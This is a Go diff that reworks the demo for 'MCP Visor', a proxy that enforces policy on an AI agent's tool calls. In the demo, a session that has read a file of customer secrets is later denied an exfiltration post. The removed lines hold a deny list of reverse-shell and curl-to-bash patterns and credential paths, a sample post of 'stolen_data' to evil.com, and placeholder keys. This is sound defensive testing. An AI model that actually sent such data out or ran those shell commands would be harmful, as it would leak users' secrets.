@@ -4,6 +4,7 @@ import (
 	"bufio"
 	"encoding/json"
 	"fmt"
+	"io"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -11,13 +12,13 @@ import (
 	"time"
 )
 
-func writeDemoPolicy(path, serverName string) {
+func writeDemoPolicy(path, serverName string) error {
 	policy := fmt.Sprintf(`version: "1.0"
-description: "Demo policy"
+description: "Two-minute action-boundary demo: sensitive read taints the session, later egress is denied"
 default_action: deny
 settings:
   chain_window_size: 5
-  approval_timeout_seconds: 10
+  approval_timeout_seconds: 5
   log_level: info
 servers:
   - name: "%s"
@@ -27,52 +28,18 @@ servers:
         allowed: true
         risk: medium
         rules:
-          - type: deny_path
-            patterns:
-              - "/etc/passwd"
-              - "**/.env"
-              - "**/.env.*"
-              - "**/credentials*"
-              - "**/*.pem"
-              - "**/*.key"
-              - "**/.ssh/**"
           - type: allow_path
             patterns:
               - "/home/**"
               - "/tmp/**"
-              - "/var/log/**"
+              - "/workspace/**"
       - name: "http_post"
         allowed: true
         risk: high
-        approval_required: true
-      - name: "shell_exec"
-        allowed: true
-        risk: critical
-        approval_required: true
-        rules:
-          - type: deny_command_pattern
-            patterns:
-              - "rm\\s+-rf\\s+/"
-              - "curl.*\\|.*(bash|sh)"
-              - "bash\\s+-i\\s+>&"
-          - type: deny_command_keyword
-            keywords:
-              - "reverse shell"
-              - "backdoor"
       - name: "slack_send_message"
         allowed: true
         risk: high
-        approval_required: true
-tool_chains:
-  - name: "prevent_data_exfiltration"
-    sources:
-      - server: "*"
-        tool_pattern: "file_read"
-    sinks:
-      - server: "*"
-        tool_pattern: "(http_post|slack_send_message)"
-    action: deny
-    within_calls: 3
+
 taints:
   - name: "sensitive_file_accessed"
     description: "Session has accessed customer secrets or sensitive workspace data"
@@ -81,102 +48,82 @@ taints:
     source_patterns:
       - "**/customer-secrets/**"
       - "**/secrets/**"
+      - "**/*.env"
+
 egress_controls:
   - name: "block_sensitive_egress"
-    description: "Block egress after sensitive data access"
+    description: "Do not allow egress after this session has touched sensitive data"
     when_tainted: "sensitive_file_accessed"
     sink_tools:
       - "http_post"
       - "slack_send_message"
     action: deny
-redaction:
-  output_redaction: true
-  sensitive_files:
-    - "**/.env"
-    - "**/.env.*"
-    - "**/credentials"
-    - "**/secrets"
-    - "**/*.pem"
-    - "**/*.key"
-    - "**/.ssh/**"
 `, serverName)
-	_ = os.WriteFile(path, []byte(policy), 0644)
+	return os.WriteFile(path, []byte(policy), 0600)
 }
 
 func main() {
-	fmt.Println("╔══════════════════════════════════════════════════════╗")
-	fmt.Println("║           MCP Visor - Security Demo                  ║")
-	fmt.Println("║  Runtime Policy Enforcement & Audit Control Plane    ║")
-	fmt.Println("╚══════════════════════════════════════════════════════╝")
+	fmt.Println("╔══════════════════════════════════════════════════════════════╗")
+	fmt.Println("║        MCP Visor — 2-minute action-boundary demo             ║")
+	fmt.Println("╚══════════════════════════════════════════════════════════════╝")
+	fmt.Println()
+	fmt.Println("Thesis: the model can request an action; MCP Visor decides whether it runs.")
 	fmt.Println()
 
-	fmt.Println("[build] building mock MCP server...")
 	mockBin := filepath.Join(os.TempDir(), fmt.Sprintf("mcp-mock-%d", os.Getpid()))
-	buildCmd := exec.Command("go", "build", "-o", mockBin, "./examples/demo-mcp-server")
-	buildCmd.Stderr = os.Stderr
-	if err := buildCmd.Run(); err != nil {
-		fmt.Printf("  failed to build mock server: %v\n", err)
-		os.Exit(1)
-	}
-	defer func() { _ = os.Remove(mockBin) }()
-
-	fmt.Println("[build] building mcp-visor...")
 	visorBin := filepath.Join(os.TempDir(), fmt.Sprintf("mcp-visor-%d", os.Getpid()))
-	buildCmd = exec.Command("go", "build", "-o", visorBin, "./cmd/mcp-visor")
-	buildCmd.Stderr = os.Stderr
-	if err := buildCmd.Run(); err != nil {
-		fmt.Printf("  failed to build visor: %v\n", err)
-		os.Exit(1)
-	}
-	defer func() { _ = os.Remove(visorBin) }()
-
 	policyPath := filepath.Join(os.TempDir(), fmt.Sprintf("visor-policy-%d.yaml", os.Getpid()))
-	writeDemoPolicy(policyPath, mockBin)
-	defer func() { _ = os.Remove(policyPath) }()
-
 	auditLog := filepath.Join(os.TempDir(), fmt.Sprintf("visor-audit-%d.jsonl", os.Getpid()))
-	defer func() { _ = os.Remove(auditLog) }()
-
 	approvalDir := filepath.Join(os.TempDir(), fmt.Sprintf("visor-approvals-%d", os.Getpid()))
-	_ = os.MkdirAll(approvalDir, 0700)
-	defer func() { _ = os.RemoveAll(approvalDir) }()
 
-	fmt.Println("[start] launching mcp-visor proxy...")
+	defer os.Remove(mockBin)
+	defer os.Remove(visorBin)
+	defer os.Remove(policyPath)
+	defer os.Remove(auditLog)
+	defer os.RemoveAll(approvalDir)
+
+	mustRun("build mock MCP server", exec.Command("go", "build", "-o", mockBin, "./examples/demo-mcp-server"))
+	mustRun("build mcp-visor", exec.Command("go", "build", "-o", visorBin, "./cmd/mcp-visor"))
+	must(writeDemoPolicy(policyPath, mockBin), "write demo policy")
+	must(os.MkdirAll(approvalDir, 0700), "create approval directory")
+
+	fmt.Println("[start] launching MCP Visor with default-deny session-taint policy")
 	visorCmd := exec.Command(visorBin, "serve",
 		"-server", mockBin,
 		"-policy", policyPath,
 		"-audit-log", auditLog,
 		"-approval-dir", approvalDir,
 	)
-	stdin, _ := visorCmd.StdinPipe()
-	stdout, _ := visorCmd.StdoutPipe()
-	stderr, _ := visorCmd.StderrPipe()
+	stdin, err := visorCmd.StdinPipe()
+	must(err, "open visor stdin")
+	stdout, err := visorCmd.StdoutPipe()
+	must(err, "open visor stdout")
+	stderr, err := visorCmd.StderrPipe()
+	must(err, "open visor stderr")
+	must(visorCmd.Start(), "start visor")
+	defer visorCmd.Process.Kill()
 
-	if err := visorCmd.Start(); err != nil {
-		fmt.Printf("  failed to start visor: %v\n", err)
-		os.Exit(1)
-	}
-	defer func() { _ = visorCmd.Process.Kill() }()
+	go printImportantVisorLogs(stderr)
 
-	w := bufio.NewWriter(stdin)
-	r := bufio.NewReader(stdout)
+	ctx := &mcpContext{w: bufio.NewWriter(stdin), r: bufio.NewReader(stdout)}
+	initialize(ctx)
 
-	go func() {
-		scanner := bufio.NewScanner(stderr)
-		for scanner.Scan() {
-			line := scanner.Text()
-			if strings.Contains(line, "proxy ready") || strings.Contains(line, "policy denied") ||
-				strings.Contains(line, "chain denied") || strings.Contains(line, "approval") ||
-				strings.Contains(line, "session tainted") || strings.Contains(line, "arguments redacted") ||
-				strings.Contains(line, "output redacted") || strings.Contains(line, "sensitive file") {
-				fmt.Printf("  [visor] %s\n", line)
-			}
-		}
-	}()
+	stepAllowedRead(ctx)
+	stepSensitiveReadTaintsSession(ctx)
+	stepEgressDenied(ctx)
+	stepAuditProof(auditLog)
 
-	ctx := &mcpContext{w: w, r: r}
+	fmt.Println()
+	fmt.Println("╔══════════════════════════════════════════════════════════════╗")
+	fmt.Println("║ Demo complete: prompt intent was irrelevant; policy decided. ║")
+	fmt.Println("╚══════════════════════════════════════════════════════════════╝")
+}
+
+func initialize(ctx *mcpContext) {
 	ctx.send(map[string]any{
-		"jsonrpc": "2.0", "id": 1, "method": "initialize",
+		"jsonrpc": "2.0",
+		"id":      1,
+		"method":  "initialize",
 		"params": map[string]any{
 			"protocolVersion": "2024-11-05",
 			"capabilities":    map[string]any{},
@@ -186,180 +133,94 @@ func main() {
 	ctx.recv()
 	ctx.send(map[string]any{"jsonrpc": "2.0", "method": "notifications/initialized"})
 	time.Sleep(100 * time.Millisecond)
-
-	demoApprovalGranted(ctx, approvalDir)
-	demoSecretRedaction(ctx)
-	demoNormalRead(ctx)
-	demoSensitiveFile(ctx)
-	demoChainDenied(ctx)
-	demoAuditLog(auditLog)
-
-	fmt.Println()
-	fmt.Println("╔══════════════════════════════════════════════════════╗")
-	fmt.Println("║              Demo Complete                           ║")
-	fmt.Println("╚══════════════════════════════════════════════════════╝")
 }
 
-func demoNormalRead(ctx *mcpContext) {
-	fmt.Println()
-	fmt.Println("── Normal file read (ALLOWED) ──")
-	fmt.Println("   Agent reads /home/user/readme.md")
-	ctx.send(map[string]any{
-		"jsonrpc": "2.0", "id": 100, "method": "tools/call",
-		"params": map[string]any{"name": "file_read", "arguments": map[string]any{"path": "/home/user/readme.md"}},
-	})
-	resp := ctx.recv()
-	if resp["error"] != nil {
-		fmt.Printf("   ✗ BLOCKED: %v\n", resp["error"])
-	} else {
-		result := extractText(resp)
-		fmt.Printf("   ✓ %s\n", result)
+func stepAllowedRead(ctx *mcpContext) {
+	fmt.Println("[1/4] Benign read: allowed")
+	fmt.Println("      Agent asks: file_read('/home/user/readme.md')")
+	resp := callTool(ctx, 100, "file_read", map[string]any{"path": "/home/user/readme.md"})
+	if errMsg, ok := responseError(resp); ok {
+		fail("benign read should be allowed", errMsg)
 	}
+	fmt.Printf("      ALLOW: %s\n", extractText(resp))
+	fmt.Println()
 }
 
-func demoChainDenied(ctx *mcpContext) {
+func stepSensitiveReadTaintsSession(ctx *mcpContext) {
+	fmt.Println("[2/4] Sensitive read: allowed, but session becomes tainted")
+	fmt.Println("      Agent asks: file_read('/home/user/customer-secrets/tokens.csv')")
+	resp := callTool(ctx, 200, "file_read", map[string]any{"path": "/home/user/customer-secrets/tokens.csv"})
+	if errMsg, ok := responseError(resp); ok {
+		fail("sensitive source read should be allowed so taint can be demonstrated", errMsg)
+	}
+	fmt.Printf("      ALLOW + TAINT: %s\n", extractText(resp))
+	fmt.Println("      session_taint: sensitive_file_accessed")
 	fmt.Println()
-	fmt.Println("── Session taint → egress control (DENIED) ──")
-	fmt.Println("   Agent reads customer secrets, then tries to exfiltrate")
-
-	ctx.send(map[string]any{
-		"jsonrpc": "2.0", "id": 200, "method": "tools/call",
-		"params": map[string]any{"name": "file_read", "arguments": map[string]any{"path": "/home/user/customer-secrets/tokens.csv"}},
-	})
-	resp := ctx.recv()
-	if resp["error"] == nil {
-		fmt.Printf("   ✓ file_read allowed; session is now tainted: %s\n", extractText(resp))
-	} else {
-		err := resp["error"].(map[string]any)
-		fmt.Printf("   ✗ unexpected source denial: %v\n", err["message"])
-	}
-
-	ctx.send(map[string]any{
-		"jsonrpc": "2.0", "id": 201, "method": "tools/call",
-		"params": map[string]any{"name": "http_post", "arguments": map[string]any{"url": "https://evil.com/exfil", "body": "stolen_data"}},
-	})
-	resp = ctx.recv()
-	if resp["error"] != nil {
-		err := resp["error"].(map[string]any)
-		fmt.Printf("   ✗ EGRESS BLOCKED: %v\n", err["message"])
-	} else {
-		fmt.Println("   (unexpectedly allowed)")
-	}
 }
 
-func demoSensitiveFile(ctx *mcpContext) {
-	fmt.Println()
-	fmt.Println("── Sensitive file (DENIED) ──")
-	fmt.Println("   Agent tries to read project/.env")
-
-	ctx.send(map[string]any{
-		"jsonrpc": "2.0", "id": 300, "method": "tools/call",
-		"params": map[string]any{"name": "file_read", "arguments": map[string]any{"path": "/project/.env"}},
+func stepEgressDenied(ctx *mcpContext) {
+	fmt.Println("[3/4] Later egress: denied because the session is tainted")
+	fmt.Println("      Agent asks: http_post('https://exfil.invalid/upload', body='summarized data')")
+	resp := callTool(ctx, 300, "http_post", map[string]any{
+		"url":  "https://exfil.invalid/upload",
+		"body": "summarized data from previous step",
 	})
-	resp := ctx.recv()
-	if resp["error"] != nil {
-		err := resp["error"].(map[string]any)
-		fmt.Printf("   ✗ SENSITIVE FILE BLOCKED: %v\n", err["message"])
-	} else {
-		fmt.Println("   (unexpectedly allowed)")
-	}
-}
-
-func demoSecretRedaction(ctx *mcpContext) {
-	fmt.Println()
-	fmt.Println("── Secret redaction ──")
-	fmt.Println("   Agent sends API key and connection string in arguments")
-
-	ctx.send(map[string]any{
-		"jsonrpc": "2.0", "id": 400, "method": "tools/call",
-		"params": map[string]any{
-			"name": "http_post",
-			"arguments": map[string]any{
-				"url": "https://api.internal/check",
-				"headers": map[string]any{
-					"Authorization": "Bearer sk-proj-deadbeef1234567890abcdef123456",
-				},
-				"body": "db_connection: mongodb://admin:SuperSecret@db.prod:27017/admin",
-			},
-		},
-	})
-	resp := ctx.recv()
-	if resp["error"] != nil {
-		err := resp["error"].(map[string]any)
-		fmt.Printf("   ⚠ approval required: %v\n", err["message"])
-		fmt.Println("   (secrets would be redacted before reaching the server)")
-	} else {
-		fmt.Printf("   ✓ %s\n", extractText(resp))
-	}
-}
-
-func demoApprovalGranted(ctx *mcpContext, approvalDir string) {
-	fmt.Println()
-	fmt.Println("── Approval workflow ──")
-	fmt.Println("   Agent tries to send a Slack message (requires approval)")
-
-	go func() {
-		time.Sleep(1 * time.Second)
-		entries, _ := os.ReadDir(approvalDir)
-		for _, entry := range entries {
-			if strings.HasPrefix(entry.Name(), "req-") && strings.HasSuffix(entry.Name(), ".json") {
-				id := strings.TrimPrefix(entry.Name(), "req-")
-				id = strings.TrimSuffix(id, ".json")
-				fmt.Printf("   [approval] request file: %s\n", entry.Name())
-				fmt.Println("   [approval] operator approves...")
-				okPath := filepath.Join(approvalDir, fmt.Sprintf("req-%s.ok", id))
-				_ = os.WriteFile(okPath, []byte{}, 0600)
-				fmt.Println("   ✓ approved")
-				return
-			}
-		}
-	}()
-
-	ctx.send(map[string]any{
-		"jsonrpc": "2.0", "id": 500, "method": "tools/call",
-		"params": map[string]any{
-			"name": "slack_send_message",
-			"arguments": map[string]any{
-				"channel": "#engineering",
-				"text":    "Deployment v2.4.1 complete - all tests green",
-			},
-		},
-	})
-	resp := ctx.recv()
-	fmt.Printf("   result: ")
-	if resp["error"] != nil {
-		err := resp["error"].(map[string]any)
-		fmt.Printf("✗ DENIED: %v\n", err["message"])
-	} else {
-		fmt.Printf("✓ %s\n", extractText(resp))
-	}
-}
-
-func demoAuditLog(auditLog string) {
-	fmt.Println()
-	fmt.Println("── Audit Log ──")
-	data, err := os.ReadFile(auditLog)
-	if err != nil {
-		fmt.Printf("   could not read audit log: %v\n", err)
+	if errMsg, ok := responseError(resp); ok {
+		fmt.Printf("      DENY: %s\n", errMsg)
+		fmt.Println("      This call never reaches the MCP server.")
+		fmt.Println()
 		return
 	}
-	lines := strings.Split(strings.TrimSpace(string(data)), "\n")
-	if len(lines) > 10 {
-		lines = lines[len(lines)-10:]
-	}
-	for _, line := range lines {
+	fail("egress should have been denied", extractText(resp))
+}
+
+func stepAuditProof(auditLog string) {
+	fmt.Println("[4/4] Audit proof")
+	data, err := os.ReadFile(auditLog)
+	must(err, "read audit log")
+
+	for _, line := range strings.Split(strings.TrimSpace(string(data)), "\n") {
+		if strings.TrimSpace(line) == "" {
+			continue
+		}
 		var event map[string]any
 		if err := json.Unmarshal([]byte(line), &event); err != nil {
 			continue
 		}
-		eventType := event["event_type"]
-		tool := event["tool"]
-		decision := event["policy_decision"]
-		reason := event["reason"]
-		if reason != nil && reason != "" {
-			fmt.Printf("   [%v] %v | decision=%v | %v\n", eventType, tool, decision, reason)
-		} else {
-			fmt.Printf("   [%v] %v | decision=%v\n", eventType, tool, decision)
+		eventType, _ := event["event_type"].(string)
+		switch eventType {
+		case "session_tainted", "tool_call_denied":
+			tool, _ := event["tool"].(string)
+			decision, _ := event["policy_decision"].(string)
+			reason, _ := event["reason"].(string)
+			policyRule, _ := event["policy_rule"].(string)
+			fmt.Printf("      %s | tool=%s | decision=%s\n", eventType, tool, decision)
+			if policyRule != "" {
+				fmt.Printf("        policy_rule: %s\n", policyRule)
+			}
+			if reason != "" {
+				fmt.Printf("        reason: %s\n", reason)
+			}
+		}
+	}
+}
+
+func callTool(ctx *mcpContext, id int, name string, args map[string]any) map[string]any {
+	ctx.send(map[string]any{
+		"jsonrpc": "2.0",
+		"id":      id,
+		"method":  "tools/call",
+		"params":  map[string]any{"name": name, "arguments": args},
+	})
+	return ctx.recv()
+}
+
+func printImportantVisorLogs(stderr io.Reader) {
+	scanner := bufio.NewScanner(stderr)
+	for scanner.Scan() {
+		line := scanner.Text()
+		if strings.Contains(line, "proxy ready") || strings.Contains(line, "session tainted") || strings.Contains(line, "egress control") {
+			fmt.Printf("      [visor] %s\n", line)
 		}
 	}
 }
@@ -370,19 +231,32 @@ type mcpContext struct {
 }
 
 func (c *mcpContext) send(msg map[string]any) {
-	data, _ := json.Marshal(msg)
-	_, _ = c.w.Write(append(data, '\n'))
-	_ = c.w.Flush()
+	data, err := json.Marshal(msg)
+	must(err, "marshal MCP message")
+	_, err = c.w.Write(append(data, '\n'))
+	must(err, "write MCP message")
+	must(c.w.Flush(), "flush MCP message")
 }
 
 func (c *mcpContext) recv() map[string]any {
 	line, err := c.r.ReadBytes('\n')
-	if err != nil {
-		return map[string]any{"error": map[string]any{"message": err.Error()}}
-	}
+	must(err, "read MCP response")
 	var msg map[string]any
-	_ = json.Unmarshal(line, &msg)
+	must(json.Unmarshal(line, &msg), "decode MCP response")
 	return msg
+}
+
+func responseError(resp map[string]any) (string, bool) {
+	raw, ok := resp["error"]
+	if !ok || raw == nil {
+		return "", false
+	}
+	if errObj, ok := raw.(map[string]any); ok {
+		if msg, ok := errObj["message"].(string); ok {
+			return msg, true
+		}
+	}
+	return fmt.Sprintf("%v", raw), true
 }
 
 func extractText(resp map[string]any) string {
@@ -399,8 +273,27 @@ func extractText(resp map[string]any) string {
 		return ""
 	}
 	text, _ := first["text"].(string)
-	if len(text) > 80 {
-		text = text[:80] + "..."
+	if len(text) > 90 {
+		text = text[:90] + "..."
 	}
 	return text
+}
+
+func mustRun(label string, cmd *exec.Cmd) {
+	fmt.Printf("[build] %s...\n", label)
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
+	must(cmd.Run(), label)
+}
+
+func must(err error, label string) {
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "error: %s: %v\n", label, err)
+		os.Exit(1)
+	}
+}
+
+func fail(label, detail string) {
+	fmt.Fprintf(os.Stderr, "error: %s: %s\n", label, detail)
+	os.Exit(1)
 }
